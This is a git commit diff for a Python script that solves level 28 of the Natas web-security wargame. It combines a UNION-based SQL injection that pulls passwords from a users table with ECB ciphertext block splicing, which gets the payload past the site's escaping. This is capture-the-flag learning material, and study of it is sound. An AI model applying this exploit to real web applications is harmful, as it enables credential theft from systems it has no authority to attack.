a794df43e237bc9d3eb4a7284c53ce9e55b13b4c
Raymond Nazaryan <rayn2427@gmail.com>
2020-04-22 21:13:57 -0700

    natas28 done

--- Natas/natas28.py
+++ Natas/natas28.py
@@ -15,7 +15,7 @@ session = requests.Session()
 
 block_size = 16
 
-# for i in range(16): # FIXME: Try 12-13 later
+# for i in range(16):
 # 	response = session.post(url, data = { "query": "a"*i }, auth = (username, password))
 
 # 	print("query_length:", i, ", response_length:", len(base64.b64decode(requests.utils.unquote(response.url[60:]))))
@@ -38,17 +38,25 @@ block_size = 16
 
 # SELECT text FROM jokes WHERE text LIKE '%inputs%'
 
-injection = 'a'*9 + "' UNION SELECT password FROM users; #"
+injection = 'a' * 9 + "' UNION SELECT password FROM users; #"
 
-blocks = (len(injection) - 10) / block_size
+blocks = (len(injection) - 10) // block_size
 if (len(injection) - 10) % block_size != 0: blocks += 1
-print(blocks)
 
-response = session.post(url, data = { "query": injection}, auth = (username, password)) # 'shrink' query from 9 to 8 so we can input %
+# 'shrink' query from 9 to 8 so we can input %
+response = session.post(url, data = { "query": injection }, auth = (username, password))
 raw_inject = base64.b64decode(requests.utils.unquote(response.url[60:]))
-# print(repr(raw_inject))
-print(raw_inject)
+
+response = session.post(url, data = { "query": 'a' * 10 }, auth = (username, password))
+good_base = base64.b64decode(requests.utils.unquote(response.url[60:]))
+
+query = good_base[:block_size * 3] + raw_inject[block_size * 3:block_size * 3 + (blocks * block_size)] + good_base[block_size * 3:]
+query =  requests.utils.quote(base64.b64encode(query)).replace('/', '%2F')
+
+response = session.get(url + '/search.php/?query=' + query, auth = (username, password))
+print(re.findall('<li>(.*)</li>', response.text)[0])
+
+# print(response.text)
 # print(repr(base64.b64decode(requests.utils.unquote(response.url[60:]))))
 # print(base64.b64decode(requests.utils.unquote(response.url[60:])))
-# print(response.text)
 # print(re.findall('=&gt; (.*)\n', response.text)[1])
